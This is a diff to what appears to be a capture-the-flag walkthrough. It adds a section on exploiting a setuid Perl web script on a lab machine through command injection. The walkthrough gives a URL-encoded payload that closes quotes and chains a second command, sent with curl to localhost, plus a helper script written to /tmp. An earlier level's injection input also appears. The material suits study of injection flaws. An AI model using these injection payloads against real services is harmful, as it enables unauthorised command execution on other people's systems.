@@ -410,3 +410,41 @@ nc localhost 5151
 # give this as an input to get the flag
 Im in; getflag > /tmp/flag; chmod 644 /tmp/flag; echo lol
 ```
+
+## Still the same perl (level12)
+
+Here we have a script that defines a server lisntening on 4646. Its setuid is
+set to this level's flag user as usual. The perl script takes two arguments
+which can be passed via url when fetching the page on localhost:4646.
+
+The script takes user input, does some kind of sanitation on it (but bad). It
+turns every lowercase character to uppercase and removes everything after the
+first whitespace occurence. Also the characters are put in between quotes to
+make sure it is only interpreted as a string. The command executed is supposed
+to look for a line that matches the string given by argument in the file
+/tmp/xd. However, since the file does not exist what we can do is simply create
+it to be an executable script, add a separator in the string we pass and close
+the quotes to run it.
+
+So we will set _$xx_ to be equal to `lol";ptdr="lol` in this command
+`egrep "^$xx" /tmp/xd 2>&1` so that it is evaluated as:
+`egrep "^LOL";PTDR="LOL" /tmp/xd 2>&1`.
+
+> Some special characters need to be specified as escape sequences to be passed
+> into url parameters. Here the _"_ is _%22_, the _;_ is _%3b_ and the _=_ is
+> _%3d_.
+
+```shell
+# create the script to run
+cat << END > /tmp/xd
+#!/bin/bash
+
+getflag > /tmp/flag
+END
+# make it executable
+chmod +x /tmp/xd
+# give the magic string that will pass sanitation
+curl localhost:4646?x=lol%22%3bptdr%3d%22lol
+# and there you go
+cat /tmp/flag
+```
